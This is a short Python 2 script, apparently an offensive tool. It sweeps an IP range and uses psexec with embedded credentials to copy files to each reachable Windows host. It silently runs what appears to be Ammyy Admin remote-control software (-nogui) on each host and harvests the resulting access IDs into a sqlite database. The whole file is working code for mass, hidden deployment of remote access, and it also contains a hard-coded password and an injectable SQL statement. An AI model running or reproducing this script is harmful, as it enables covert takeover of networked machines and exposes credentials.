#!/usr/bin/python
# -*- coding: utf-8 -*-
#avonar4eg@gmail.com
"""namespace module
ALL YOUR BASES BELONG TO US

"""
import os, shutil, time, datetime, socket
import win32wnetfile
import re
import sqlite3

log = []

def DirCopy(ip, srcdir, dstdir, hostname):
    # copy file to remote ip
    # IMPORTANT! scrdit example "C:/1/2"
    global log
    file_list = os.listdir(srcdir)
    for i in file_list:
        if os.path.isfile(os.path.join(u'%s'%srcdir, u'%s'%i.decode('cp1251'))):
            print u'start copy %s to %s'%(ip, i.decode('cp1251'))
            try:
                win32wnetfile.netcopy(u'%s'%ip, srcdir.replace('/', '\\') + '\\' + i.decode('cp1251'), dstdir, 'fas', 'Ctrjyl02')
            except:
                print 'failed %s'%i.decode('cp1251')
                log.append(u'failed to load' + ip + i.decode('cp1251'))

def main():
    global ID
    con = sqlite3.connect('ammy.db')
    cur = con.cursor()
    cur.execute('CREATE TABLE IF NOT EXISTS ammy (hostname VARCHAR(100), id VARCHAR(100));')
    con.commit()
    cur.execute('CREATE UNIQUE INDEX IF NOT EXISTS data_idx ON ammy(hostname, ID);')
    con.commit()
    iprange = raw_input('input ip range (example:192.168.1.1-192.168.1.10) :')
    start_ip = iprange.split('-')[0].split('.')
    stop_ip = iprange.split('-')[1].split('.')
    count = int(start_ip[len(stop_ip) -1])
    count_stop =  int(stop_ip[len(stop_ip) -1])
    ip_list = []

    while count <= count_stop:
        ip = u'.'.join(start_ip[0:len(start_ip)-1]) + '.' +str(count)
        print ip
        if 'TTL' in os.popen('ping %s'%ip).read():
            #host must be reachable
            host = os.popen('psexec.py  :@%s "hostname"'%ip).read()
            try:
                host = re.findall(r'(.+?)\r', host, re.S)[0]
            except:
                continue
            DirCopy(ip, './1', 'C:\\1', host)
            os.system(u'psexec.py  :@%s "c:\\1\\AA_v3.5.exe -outid -nogui"'%ip)
            ID = os.popen('psexec.py  :@%s cmd /c "TYPE C:\\1\\ammyy_id.log"'%ip).read()
            ID = re.findall(r'ID=(.+?)\n', ID, re.S)[0]
            cur.execute('INSERT OR REPLACE INTO ammy (hostname, id) VALUES("%s", "%s")'%(host, ID))
            con.commit()
            print ID
            print host
        count += 1
    con.close()



if __name__ == '__main__':
    main()
    print 'Done!'
